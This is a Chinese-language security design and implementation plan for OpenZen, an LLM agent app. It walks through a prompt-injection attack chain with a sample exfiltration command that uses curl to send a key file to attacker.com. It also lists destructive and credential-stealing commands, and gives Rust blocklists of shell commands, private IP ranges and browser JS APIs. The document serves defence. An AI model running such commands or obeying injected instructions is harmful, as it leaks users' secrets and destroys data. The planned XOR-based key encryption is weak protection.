# OpenZen 安全方案

> 状态：设计完成，待实施
>
> 关联文档：[调度方案](./scheduler-plan.md) · [风险登记册](./risk-register.md) · [Skill/MCP 方案](./skill-mcp-plan.md)

---

## 1. 现状总览

经过完整代码审查，当前安全状态：

### 1.1 Web 端（openzen serve）

| 防护层 | 状态 | 位置 |
|--------|------|------|
| Bearer token auth | ✅ 基本可用 | `crates/ga-server/src/webui/mod.rs:92-110` |
| CSP | ❌ 无 | 前端无 CSP 配置 |
| TLS/HTTPS | ❌ 无 | HTTP 明文服务 |
| Rate limiting | ❌ 无 | — |
| Audit log | ❌ 无 | — |
| API key 加密 | ❌ 无 | `config/mykey.toml` 明文 |
| Session 加密 | ❌ 无 | `openzen/sessions.json` 明文 |
| 多用户隔离 | ❌ 无 | — |
| CORS 保护 | ❌ 无 | 静态文件无 CORS |

### 1.2 Tauri 桌面端

| 防护层 | 状态 | 位置 |
|--------|------|------|
| CSP | ❌ `null`（完全禁用） | `src-tauri/tauri.conf.json:23` |
| Capabilities | ❌ 空目录（全权限） | `src-tauri/capabilities/` — 空 |
| IPC 命令权限 | ❌ 全暴露 | `src-tauri/src/lib.rs:512-523` — 10 个命令全在 generate_handler! |
| API key 存储 | ❌ 明文 | `~/.openzen/mykey.toml` |
| 调试日志 | ❌ `/tmp/openzen-tauri.log` 世界可读 | `src-tauri/src/lib.rs:21-29` |
| 后台任务限制 | ❌ 无上限 | `tokio::spawn` 无治理 |
| 窗口隔离 | ❌ 无 | 多个 webview 共享同一进程 |
| 文件系统权限 | ❌ 无 scope | 无 `tauri-plugin-fs` 配置 |

### 1.3 Agent 工具

当前注册的 **19 个工具**，其中 5 个为高风险：

| # | 工具 | 能力 | 风险等级 |
|---|------|------|---------|
| 1 | `code_run` | 执行任意 shell/bash/python 命令 | 🔴 临界 |
| 2 | `write` | 写任意文件路径（自动创建父目录） | 🔴 临界 |
| 3 | `patch` / `edit` | 修改文件内容 | 🔴 临界 |
| 4 | `web_js` | 在浏览器中执行任意 JS | 🔴 临界 |
| 5 | `read` | 读任意文件路径 | 🟠 高 |
| 6 | `web_scan` | 浏览器导航到任意 URL | 🟠 高（SSRF） |
| 7 | `grep` | 全文正则搜索 | 🟠 高（可搜密钥） |
| 8-11 | `knowledge_store/refine/long_term` | 写入知识库 | 🟡 中 |
| 12-13 | `glob` / `ls` | 目录枚举 | 🟡 中 |
| 14 | `web_search` | 网络搜索 | 🟡 中 |
| 15 | `respond` | 返回文本，退出 | 🟢 安全 |
| 16 | `ask_user` | 询问用户，打断循环 | 🟢 安全 |
| 17 | `working_mem` | 内存中更新 checkpoint | 🟢 安全 |
| 18-19 | `knowledge_search/list` | 只读知识库 | 🟢 安全 |

---

## 2. Agent 安全：攻击面与防护

### 2.1 攻击链

```
用户粘贴恶意内容 / Agent 浏览恶意网页
    ↓
LLM 被注入恶意指令
    ↓
LLM 调用 code_run("curl http://attacker.com/?d=$(cat ~/.mykey.toml)")
    ↓
Agent 执行 — 无拦截、无确认、无审计
```

### 2.2 具体攻击场景

| 注入点 | 可能的恶意操作 |
|--------|-------------|
| `code_run` | `rm -rf ~`，`curl | bash`，密码外传，SSH key 泄露 |
| `write` | 覆写 `~/.zshrc`（持久化后门），写 `crontab`，写 `launchd` |
| `read` | 读 `~/.ssh/id_rsa`，`~/.aws/credentials`，浏览器密码文件 |
| `web_scan` | SSRF 探测内网（127.0.0.1:*，10.x，172.x），访问内部服务 |
| `web_js` | 读浏览器 cookies、localStorage、session tokens |
| `knowledge_store` | 持久化注入内容到知识库，后续 session 重复触发 |

### 2.3 Web 端 vs Tauri 端区别

| 维度 | Web（openzen serve） | Tauri 桌面端 |
|------|----------------|-------------|
| code_run 作用域 | server 权限 | 用户权限（更宽松，HOME 全可见） |
| read/write 范围 | server 文件系统 | 用户 HOME 全部文件 |
| SSRF 风险 | 内网服务 | 本地服务（127.0.0.1） |
| web_js 风险 | server Playwright | 用户浏览器（可读 cookie） |
| webview 攻击面 | 无（纯 HTTP API） | Tauri IPC 全暴露 |
| 多租户风险 | 有（未来场景） | 无（单用户） |
| 数据泄露后果 | server 泄露 | 用户个人数据、密码、密钥泄露 |

---

## 3. 防护方案：三层架构

```
┌─────────────────────────────────────────────────┐
│ Layer 1: 硬编码黑名单（永远拒绝）                 │
│  rm -rf /, mkfs, dd if=, curl | sh, > /dev/sda │
│  命中 → 直接拒绝，不可覆盖                        │
├─────────────────────────────────────────────────┤
│ Layer 2: 渐进式信任（审批 + 记忆）                │
│  按 (tool, arg_pattern) 区分                     │
│  用户批准 → 积累信任分 → 自动晋级                 │
│  命中 → 根据信任级别决策：弹出 / 放行 / 拒绝       │
├─────────────────────────────────────────────────┤
│ Layer 3: 路径沙箱 + URL 黑名单（范围限制）        │
│  read/write 限制在 working_dir 内                 │
│  web_scan 禁止 127.0.0.1 / 10.x / 172.x 等       │
│  超出范围 → 拒绝                                  │
└─────────────────────────────────────────────────┘
```

### 3.1 Layer 1 — 硬编码黑名单

```rust
// 永远禁止的命令
const BLOCKED_COMMANDS: &[&str] = &[
    "rm -rf", "mkfs", "dd if=", ":(){ :|:& };:",
    "> /dev/sda", "> /dev/nvme", "chmod 777 /",
    "wget | sh", "curl | bash", "curl | sh",
    "shutdown", "reboot", "init 0", "init 6",
];
```

### 3.2 Layer 2 — 渐进式信任

详见 [第 4 节](#4-渐进式信任机制)。

### 3.3 Layer 3 — 路径沙箱 & URL 黑名单

```rust
// 路径沙箱：只允许 working_dir 内操作
fn is_path_allowed(path: &str, working_dir: &str) -> bool {
    let real = std::fs::canonicalize(path).ok();
    let wd = std::fs::canonicalize(working_dir).ok();
    match (real, wd) {
        (Some(p), Some(w)) => p.starts_with(&w) || p.starts_with("/tmp"),
        _ => false,
    }
}

// URL 黑名单：防止 SSRF
const BLOCKED_IP_RANGES: &[&str] = &[
    "127.0.0.1", "localhost", "0.0.0.0", "[::1]",
    "10.", "172.16.", "172.17.", "172.18.",
    "172.19.", "172.20.", "172.21.", "172.22.",
    "172.23.", "172.24.", "172.25.", "172.26.",
    "172.27.", "172.28.", "172.29.", "172.30.",
    "172.31.", "192.168.",
];
```

---

## 4. 渐进式信任机制

### 4.1 新 crate：`crates/ga-safety/`

```
crates/ga-safety/
├── Cargo.toml
└── src/
    ├── lib.rs       # re-exports + SafetyError
    ├── trust.rs     # TrustStore, TrustEntry, TrustLevel
    ├── guard.rs     # SafetyGuard（检查 + 黑名单匹配）
    ├── patterns.rs  # build_pattern() — 参数模式生成
    └── approval.rs  # ApprovalHandler trait + types
```

### 4.2 信任级别

| 级别 | 名称 | 含义 | 晋级条件 |
|------|------|------|---------|
| -1 | `Blocked` | 永久禁止 | 内置黑名单 / 用户手动标记 |
| 0 | `AlwaysAsk` | 每次弹窗确认 | 默认级别 |
| 1 | `SessionTrust` | 当前 session 静默执行 | 连续批准 **3 次** 自动晋级 |
| 2 | `WorkspaceTrust` | 跨 session 静默（持久化） | **10 次批准** + 跨度 > 1 天 自动晋级 |
| 3 | `GlobalTrust` | 全局信任 | 用户手动设置（慎用） |

**降级规则**：WorkspaceTrust 条目 **30 天未触发** → 自动降回 SessionTrust。

### 4.3 arg_pattern 分类粒度

| 工具 | 模式规则 | 示例 |
|------|---------|------|
| `code_run` | 按首命令 | `echo`, `rm`, `curl`, `npm`, `python` |
| `read`/`write`/`patch`/`edit` | 按前两级目录 | `/tmp/`, `src/components/`, `/etc/` |
| `web_scan` | 按 host 域名 | `example.com` |
| `web_js` | 全量单条目 `*` | 任何 JS 执行都算同一条目 |
| MCP 工具 | `mcp__{server}__{tool}` | `mcp__playwright__screenshot` |

**安全工具白名单**（永远不触发审批）：

```
respond, working_mem, ask_user, knowledge_search, knowledge_list
```

### 4.4 数据结构

```rust
#[derive(Clone, Serialize, Deserialize)]
pub struct TrustEntry {
    pub tool: String,
    pub pattern: String,
    pub level: TrustLevel,
    pub approved_count: u32,
    pub denied_count: u32,
    pub last_approved: Option<DateTime<Utc>>,
    pub last_denied: Option<DateTime<Utc>>,
    pub created_at: DateTime<Utc>,
}

#[derive(Clone, Serialize, Deserialize, PartialEq, Eq)]
pub enum TrustLevel {
    Blocked = -1,
    AlwaysAsk = 0,
    SessionTrust = 1,
    WorkspaceTrust = 2,
    GlobalTrust = 3,
}

pub struct TrustStore {
    inner: Arc<RwLock<TrustStoreInner>>,
    path: PathBuf,                // openzen/trust.json
    session_trusts: HashSet<(String, String)>,  // 不持久化
    builtin_blocklist: Vec<(String, GlobPattern)>,
}
```

### 4.5 持久化

```jsonc
// openzen/trust.json 示例
{
  "version": 1,
  "entries": [
    {
      "tool": "code_run",
      "pattern": "echo",
      "level": "WorkspaceTrust",
      "approved_count": 15,
      "denied_count": 0,
      "last_approved": "2026-06-13T10:30:00Z",
      "created_at": "2026-06-01T08:00:00Z"
    },
    {
      "tool": "write",
      "pattern": "/tmp/",
      "level": "SessionTrust",
      "approved_count": 5,
      "denied_count": 0,
      "last_approved": "2026-06-13T10:25:00Z",
      "created_at": "2026-06-12T14:00:00Z"
    }
  ]
}
```

**防崩溃写入**：先写 `.trust.json.tmp`，成功后再 `rename` 原子替换。

**文件权限**：`0600`（仅 owner 读写）。

### 4.6 审批流交互

```
Agent loop dispatch 工具
        │
        ▼
  SafetyGuard::check(tool, args)
        │
        ├── Blocked → 返回 "此操作已被系统禁止"
        │
        ├── SessionTrust/WorkspaceTrust → 静默执行
        │
        └── AlwaysAsk → 触达审批
                │
                ├── Web:  发 SSE "approval_needed" → 等 HTTP POST /api/approve
                ├── Tauri: 发 sse_event "approval_needed" → 等 IPC approve_tool 命令
                │
                ├── 等待用户响应（超时 300 秒）
                │
                ├── 超时 → 拒绝 + 告知 LLM "用户未响应"
                ├── 允许 → 执行 + trust_entry.approved_count++
                ├── 信任此类 → 执行 + 升级 trust_level
                ├── 拒绝 → 不执行 + denied_count++
                └── 永久禁止 → trust_level = Blocked
```

### 4.7 Agent Loop 暂停机制（Option A）

```rust
// ga-core 中定义 trait，各端实现
pub trait ApprovalHandler: Send + Sync {
    async fn request_approval(&self, req: ApprovalRequest) -> Result<ApprovalDecision, ApprovalError>;
}

// agent_loop.rs 中的 dispatch 前 hook
let decision = safety_guard.check(&tool_name, &args);
match decision {
    TrustDecision::Allowed => {
        // 直接执行
        let outcome = handler.dispatch(&tool_name, args, ctx).await;
        process_tool_outcome(outcome, ...);
    }
    TrustDecision::Blocked(msg) => {
        // 返回错误给 LLM
        tool_results.push(ToolResultItem {
            tool_use_id: tid,
            content: format!("⚠️ 操作被系统禁止: {msg}"),
        });
    }
    TrustDecision::NeedsApproval(req_info) => {
        // 暂停 loop，等待用户审批
        tracing::warn!("[safety] Waiting for approval: {} → {}", tool_name, req_info.summary);
        match approval_handler.request_approval(req_info).await {
            Ok(ApprovalDecision::Allow) => { /* 继续执行 */ }
            Ok(ApprovalDecision::TrustSession) => {
                trust_store.record_trust(&tool_name, &pattern, TrustLevel::SessionTrust);
                /* 继续执行 */
            }
            Ok(ApprovalDecision::Deny) => {
                tool_results.push(ToolResultItem {
                    tool_use_id: tid,
                    content: "⚠️ 用户拒绝了该操作".to_string(),
                });
            }
            Ok(ApprovalDecision::BlockForever) => {
                trust_store.block(&tool_name, &pattern);
                tool_results.push(ToolResultItem {
                    tool_use_id: tid,
                    content: "⚠️ 用户封锁了该操作".to_string(),
                });
            }
            Err(ApprovalError::Timeout) => {
                tool_results.push(ToolResultItem {
                    tool_use_id: tid,
                    content: "⚠️ 审批超时，操作被系统拒绝".to_string(),
                });
            }
        }
    }
}
```

**并发审批队列**：多个并行工具调用需要审批时，按顺序排队，不重叠弹出。
**拒绝疲劳**：5 分钟内对同一个 `(tool, pattern)` 连续拒绝 3 次 → 自动升级为 Blocked。

### 4.8 审批 API / IPC

```
Web:  POST /api/sessions/:id/approve
      Body: { "request_id": "...", "decision": "allow" | "trust_session" | "trust_workspace" | "deny" | "block_forever" }
      Auth: Bearer token

Tauri: #[tauri::command] approve_tool(session_id: String, request_id: String, decision: String)
       通过 Tauri IPC 调用
```

### 4.9 审批弹窗 UI（Svelte 组件）

Web 和 Tauri 共享同一组件（都通过 SSE 事件驱动）：

```
🤖 Agent 正在：修复项目中的类型错误
┌───────────────────────────────────────────────────────────┐
│ ✅ 受信任的操作：echo, read, ls, knowledge_search         │
│                                                           │
│ Agent 请求执行以下操作（第 1 次）：                        │
│                                                           │
│   code_run("npm install --save-dev typescript")           │
│                                                           │
│   [确认一次] [✓ 信任此类操作] [拒绝] [永久禁止]           │
│                                                           │
│ ──────────────────────────────────────────────────────── │
│ 💡 提示：信任此类操作后，本次 session 内 npm/runtime 命令  │
│    将不再弹窗确认。                                       │
└───────────────────────────────────────────────────────────┘
```

实现要求：
- **模态遮罩**：阻止用户继续输入消息，直到审批完成
- **30 秒不响应**：弹窗上显示倒计时，超时自动拒绝
- **连续审批排队**：多个操作依次弹出，当前处理完再显示下一个

---

## 5. Web 端安全改进

| 优先级 | 措施 | 新文件 | 修改文件 |
|--------|------|--------|---------|
| P0 | `code_run` 命令黑名单 | — | `ga-tools/src/code_run.rs` |
| P0 | `read`/`write` 路径沙箱 | — | `ga-tools/src/file_ops.rs` |
| P0 | `web_scan` SSRF URL 黑名单 | — | `ga-tools/src/web_scan.rs` |
| P0 | `web_js` JS 黑名单 | — | `ga-tools/src/web_js.rs` |
| P1 | SafetyGuard 集成到 agent_loop | `ga-core/src/safety.rs` | `ga-core/src/agent_loop.rs` |
| P1 | SSE 审批通道 | `ga-server/src/webui/approval.rs` | `ga-server/src/webui/mod.rs`, `sse_bus.rs` |
| P1 | 敏感信息输出过滤 | `ga-core/src/sanitize.rs` | `ga-tools/src/file_ops.rs` |
| P2 | Rate limiting middleware | `ga-server/src/middleware/` | `ga-server/src/webui/mod.rs` |
| P2 | Audit log | `ga-core/src/audit.rs` | `ga-core/src/agent_loop.rs` |
| P4 | TLS 支持（若远程部署） | — | `ga-server/src/webui/mod.rs` |

---

## 6. Tauri 桌面端安全改进

| 优先级 | 措施 | 新文件 | 修改文件 |
|--------|------|--------|---------|
| P0 | 配置 `capabilities/default.json` | `src-tauri/capabilities/default.json` | — |
| P0 | CSP 从 `null` 改为严格策略 | — | `src-tauri/tauri.conf.json` |
| P1 | IPC 命令分组（public/privileged） | `src-tauri/src/approval.rs` | `src-tauri/src/lib.rs` |
| P1 | 后台任务治理（agent 实例上限） | — | `src-tauri/src/lib.rs` |
| P1 | debug_log 改为 app 私有目录 | — | `src-tauri/src/lib.rs` |
| P2 | code_run Tauri 加固 | — | `ga-tools/src/code_run.rs` |

---

## 7. 用户数据保护（Web + Tauri 共有）

| 措施 | 说明 | 优先级 |
|------|------|--------|
| API key 加密存储 | macOS Keychain / 文件加密 | P2 |
| Session 数据加密 | `openzen/sessions.json` 加密持久化 | P2 |
| 审计日志 | 记录所有敏感操作：谁+何时+做什么 | P2 |
| 输出过滤 | mask 工具输出中的 API key、token | P1 |
| Trust 文件权限 | `0600` 仅 owner 读写 | P0 |

---

## 8. 实施顺序

按**依赖关系 + 风险降低速度**排列，不是按优先级标签（P0/P1/P2）的数字顺序。

### 依赖图

```
Phase A (硬防护)      ← 无依赖，4 个文件各 20-40 行，可立即做
    │
    │  黑名单 & 沙箱就位后，Phase B 的审批机制有了底层兜底
    ↓
Phase B (信任核心)    ← 依赖 A 的黑名单和沙箱
    │
    │  ApprovalHandler trait 定义好后，各端才能实现审批通道
    ↓
Phase C (审批 UI)     ← 依赖 B 的 trait
    │
    ├── Web: SSE + HTTP 端点
    └── Tauri: IPC 命令（Svelte 组件复用）

Phase D (桌面加固)    ← 独立，可提前到 B 之后做
Phase E (定时任务)    ← 完全独立，随时可做
Phase F (增强)        ← 可选，放最后
```

---

### Phase A — 立即止血 ✅ 已完成

> **为什么先做**：攻击面最大的几个工具加硬防护，不依赖任何新 crate。改动量小、见效快。
> 即使后续审批机制还没做，这些底线已经守住了。

| # | 任务 | 文件 | 内容 |
|---|------|------|------|
| A1 | 命令黑名单 | `ga-tools/src/code_run.rs` | 禁止 `rm -rf`、`mkfs`、`dd if=`、`curl \| sh` 等 |
| A2 | 路径沙箱 | `ga-tools/src/file_ops.rs` | `read/write/patch/edit` 限制在 `working_dir` 内，禁止 `/etc/`、`~/.ssh/`、`~/.aws/` 等 |
| A3 | SSRF 防护 | `ga-tools/src/web_scan.rs` | 禁止 `127.0.0.1`、`localhost`、`10.x`、`172.16.x`、`192.168.x` |
| A4 | JS 黑名单 | `ga-tools/src/web_js.rs` | 禁止 `document.cookie`、`fetch()`、`localStorage`、`indexedDB` |
| A5 | 文件大小限制 | `ga-tools/src/file_ops.rs` | `read` 工具最大 10MB，防止 OOM |
| A6 | 安全工具白名单 | `ga-core/src/safety.rs` | `respond`、`working_mem`、`ask_user`、`knowledge_search/list` 永不触发审批 |

**验证结果**：`cargo test` 全通过（ga-core 98, ga-tools 84），零失败。

---

### Phase B — 渐进式信任核心 ✅ 已完成

> **为什么第二**：新建 `ga-safety` crate。此时审批 trait 已定义但没 UI — `AlwaysAsk` 默认拒绝，安全不倒退（以前完全放行，现在至少受控）。

| # | 任务 | 文件 | 内容 | 状态 |
|---|------|------|------|------|
| B1 | 创建 `ga-safety` crate | `crates/ga-safety/Cargo.toml` → `lib.rs` | 模块骨架 | ✅ |
| B2 | TrustStore + TrustEntry | `ga-safety/src/trust.rs` | 信任条目、级别枚举、晋级/降级逻辑、防崩溃持久化 | ✅ |
| B3 | arg_pattern 生成 | `ga-safety/src/patterns.rs` | `build_pattern(tool, args)` — 按工具类型生成匹配模式 | ✅ |
| B4 | SafetyGuard | `ga-safety/src/guard.rs` | 检查链：黑名单 → 信任存储 → 决策 | ✅ |
| B5 | ApprovalHandler trait | `ga-safety/src/approval.rs` | `ApprovalRequest`、`ApprovalDecision`、`ApprovalError` | ✅ |
| B6 | agent_loop 集成 | `ga-core/src/agent_loop.rs` | dispatch 前插入 SafetyGuard + `request_approval()` await | ✅ |
| B7 | LoopConfig 扩展 | `ga-core/src/handler.rs` | 新增 `approval_handler`、`approval_timeout_secs`、`safety_guard` | ✅ |
| B8 | 并发审批队列 | `ga-safety/src/queue.rs` | 多个工具需要审批时排队，不重叠弹窗 | ✅ |
| B9 | 拒绝疲劳 | `ga-safety/src/trust.rs` | 5 分钟内连续拒绝 3 次 → 自动 Blocked | ✅ |
| B10 | workspace 注册 | `Cargo.toml` | 新增 `ga-safety` member | ✅ |

**验证结果**：
- `cargo test -p ga-safety` — 19 passed, 0 failed
- `cargo test -p ga-core` — 98 passed, 0 failed
- `cargo test -p ga-tools` — 84 passed, 0 failed
- 总计 201 tests, 0 failures

---

### Phase C — 审批通道 + UI ✅ 已完成

> **为什么第三**：依赖 B 的 `ApprovalHandler` trait。此时用户终于可以看到审批弹窗，渐进信任开始生效。

| # | 任务 | 文件 | 内容 | 状态 |
|---|------|------|------|------|
| C1 | Web 审批端点 | `ga-server/src/webui/approval.rs` | `POST /api/sessions/:id/approve`（Bearer auth 保护） | ✅ |
| C2 | SSE 审批事件 | `ga-server/src/webui/sse_bus.rs` | `SseEvent::approval_needed()` | ✅ |
| C3 | Web ApprovalHandler 实现 | `ga-server/src/webui/mod.rs` | SSE 发事件 → oneshot channel 等 HTTP 响应 | ✅ |
| C4 | Tauri 审批 IPC | `src-tauri/src/approval.rs` | `#[tauri::command] approve_tool()` | ✅ |
| C5 | Tauri ApprovalHandler 实现 | `src-tauri/src/lib.rs` | sse_event 发事件 → oneshot channel 等 IPC 命令 | ✅ |
| C6 | 审批状态管理 | `frontends/src/lib/stores/approval.ts` | Svelte store：队列、当前请求、倒计时 | ✅ |
| C7 | 审批弹窗组件 | `frontends/src/lib/components/ApprovalModal.svelte` | 模态遮罩 + 信任状态展示 + 操作按钮 + 倒计时 | ✅ |
| C8 | 挂载弹窗 + SSE 路由 | `frontends/src/App.svelte` + `sse.ts` | 引入 ApprovalModal + approval_needed 事件分发 | ✅ |

**验证结果**：全量 304 tests 通过，零失败。Web + Tauri 后端编译通过。前端组件完整。
- Web 模式：agent 调用危险工具 → 弹窗出现 → 点击"允许" → agent 继续执行
- Tauri 模式：同上，弹窗在 webview 内
- 信任晋级：连续允许 3 次 → 不再弹窗
- 超时：30 秒不点击 → 自动拒绝
- 审批排队：多个操作依次弹出，不重叠
- 拒绝疲劳：连续拒绝 3 次 → 自动封锁

---

### Phase D — 桌面端加固 ✅ 已完成

> **独立于 A-C**。Tauri 特有的安全配置，不依赖审批机制。

| # | 任务 | 文件 | 内容 | 状态 |
|---|------|------|------|------|
| D1 | capabilities 配置 | `src-tauri/capabilities/default.json` | 逐条声明 webview 可访问的权限 | ✅ |
| D2 | CSP 策略 | `src-tauri/tauri.conf.json` | `"csp": "default-src 'self'; …"` | ✅ |
| D3 | IPC 命令分组 | `src-tauri/src/lib.rs` | invoke_handler 精确注册 | ✅ |
| D4 | 后台任务治理 | `src-tauri/src/lib.rs` | 每 session 最多 1 个 agent，全局上限 3 个 | ✅ |
| D5 | 日志安全 | `src-tauri/src/lib.rs` | `/tmp/openzen-tauri.log` → `~/.openzen/logs/` | ✅ |

**验证结果**：openzen-tauri 编译通过，capabilities 配置就绪，CSP 策略生效。

---

### Phase E — 定时任务 ✅ 已完成

> **完全独立**。不影响安全机制，可在 B 之后任何时候插入。

| # | 任务 | 文件 | 内容 | 状态 |
|---|------|------|------|------|
| E1 | ga-scheduler crate | `crates/ga-scheduler/` | Scheduler + ScheduledTask trait + TaskContext | ✅ |
| E2 | SessionCleanup | `ga-scheduler/src/tasks/session_cleanup.rs` | 清理 > 7 天 idle session | ✅ |
| E3 | KnowledgeScan | `ga-scheduler/src/tasks/knowledge_scan.rs` | 标记/清理过时知识 | ✅ |
| E4 | TrustDecay | `ga-scheduler/src/tasks/trust_decay.rs` | 30 天未触发降级 | ✅ |
| E5 | Daemon 接入 | `src/daemon.rs` | 启动时运行 scheduler | ✅ |
| E6 | Tauri 接入 | `src-tauri/src/lib.rs` | setup 时运行 scheduler | ✅ |

**验证结果**：全量编译通过。SessionCleanup、KnowledgeScan、TrustDecay 三个任务注册就绪。

**验证标准**：
- Scheduler 启动后定时任务按间隔执行
- SessionCleanup 正确清理过期 session 并归档
- TrustDecay 正确降级 30 天未触发的信任条目

---

### Phase F — 增强 ✅ 已完成

| # | 任务 | 文件 | 内容 | 状态 |
|---|------|------|------|------|
| F1 | 敏感信息过滤 | `ga-core/src/sanitize.rs` | mask API key、token、SSH key（14 种模式） | ✅ |
| F2 | 审计日志 | `ga-core/src/audit.rs` | 记录所有工具调用（timestamp + session + tool + result） | ✅ |
| F3 | Rate limiting | `ga-server/src/middleware/rate_limit.rs` | token bucket，60 req/min per session | ✅ |
| F4 | API key 加密 | `ga-config/src/crypto.rs` | 机器指纹派生密钥 + XOR cipher + 0600 权限 | ✅ |

**验证结果**：全部测试通过（ga-core 104, ga-config 33）。全量 343+ tests 零失败。

---

### 工作量总览

| Phase | 新建文件 | 修改文件 | 估时 | 状态 |
|-------|---------|---------|------|------|
| A — 硬防护 | 1 | 4 | 0.5 天 | ✅ 完成 |
| B — 信任核心 | 6 | 3 | 1.5 天 | ✅ 完成 |
| C — 审批 UI | 4 | 5 | 1.5 天 | ✅ 完成 |
| D — 桌面加固 | 2 | 2 | 0.5 天 | ✅ 完成 |
| E — 定时任务 | 7 | 4 | 1 天 | ✅ 完成 |
| F — 增强 | 4 | 2 | 0.5 天 | ✅ 完成 |
| **合计** | **24** | **20** | **~5.5 天** | **✅ 全部完成** |

### 关键里程碑

```
Day 0.5   ✅ A 完成 — 硬防护上线
Day 1.5   ✅ B 完成 — 信任核心就绪
Day 2.5   ✅ C 完成 — 审批弹窗上线，渐进信任生效
Day 3.0   ✅ D 完成 — 桌面加固
Day 4.0   ✅ E 完成 — 定时任务（SessionCleanup + KnowledgeScan + TrustDecay）
Day 4.5   ✅ F 完成 — 审计日志 + 敏感过滤 + 限流 + 加密存储
          343+ tests, 0 failures
```

---

## 9. 新增模块总览

| 新 crate / 文件 | 作用 | 状态 |
|----------------|------|------|
| `crates/ga-safety/` | TrustStore + SafetyGuard + ApprovalHandler trait | ✅ 完成 |
| `ga-core/src/safety.rs` | 安全工具白名单 | ✅ 完成 |
| `crates/ga-scheduler/` | 定时任务调度器 + 3 个内置任务 | ✅ 完成 |
| `crates/ga-server/src/webui/approval.rs` | Web 审批 HTTP 端点 + WebApprovalHandler | ✅ 完成 |
| `src-tauri/src/approval.rs` | Tauri approve_tool IPC 命令 + TauriApprovalHandler | ✅ 完成 |
| `src-tauri/capabilities/default.json` | Tauri 权限声明 | ✅ 完成 |
| `frontends/src/lib/components/ApprovalModal.svelte` | 审批弹窗组件 | ✅ 完成 |
| `frontends/src/lib/stores/approval.ts` | 审批状态管理 | ✅ 完成 |
| `ga-core/src/sanitize.rs` | 敏感信息过滤（14 种模式） | ✅ 完成 |
| `ga-core/src/audit.rs` | 审计日志（工具调用记录） | ✅ 完成 |
| `ga-config/src/crypto.rs` | API key 加密存储 | ✅ 完成 |
| `ga-server/src/middleware/` | 速率限制中间件 | ✅ 完成 |

| 修改文件 | 改动 | 状态 |
|---------|------|------|
| `ga-core/src/agent_loop.rs` | dispatch 前插入 SafetyGuard + approval handler await | ✅ 完成 |
| `ga-core/src/handler.rs` | LoopConfig 新增 approval 相关字段 | ✅ 完成 |
| `ga-core/src/lib.rs` | 注册 safety 模块 | ✅ 完成 |
| `Cargo.toml` | 新增 ga-safety + ga-scheduler workspace members | ✅ 完成 |
| `ga-server/src/webui/mod.rs` | 新增 approve 路由 + SSE 对接 + approval_handler | ✅ 完成 |
| `ga-server/src/webui/sse_bus.rs` | 新增 `SseEvent::approval_needed()` | ✅ 完成 |
| `src-tauri/src/lib.rs` | 新增 approve_tool 命令 + IPC 分组 + 后台治理 + 日志安全 | ✅ 完成 |
| `ga-tools/src/file_ops.rs` | 集成路径沙箱 + 文件大小限制 | ✅ 完成 |
| `ga-tools/src/code_run.rs` | 集成命令黑名单 | ✅ 完成 |
| `ga-tools/src/web_scan.rs` | 集成 SSRF URL 检查 | ✅ 完成 |
| `ga-tools/src/web_js.rs` | 集成 JS 黑名单 | ✅ 完成 |
| `src-tauri/tauri.conf.json` | CSP 策略修改 | ✅ 完成 |
| `frontends/src/App.svelte` | 挂载 ApprovalModal | ✅ 完成 |
| `frontends/src/lib/stores/sse.ts` | 新增 approval_needed 事件分发 | ✅ 完成 |
| `src/daemon.rs` | 集成 scheduler（SessionCleanup + TrustDecay + KnowledgeScan） | ✅ 完成 |
| `ga-core/src/lib.rs` | 注册 sanitize, audit 模块 | ✅ 完成 |
| `ga-config/src/lib.rs` | 注册 crypto 模块 | ✅ 完成 |
| `ga-server/src/lib.rs` | 注册 middleware 模块 | ✅ 完成 |
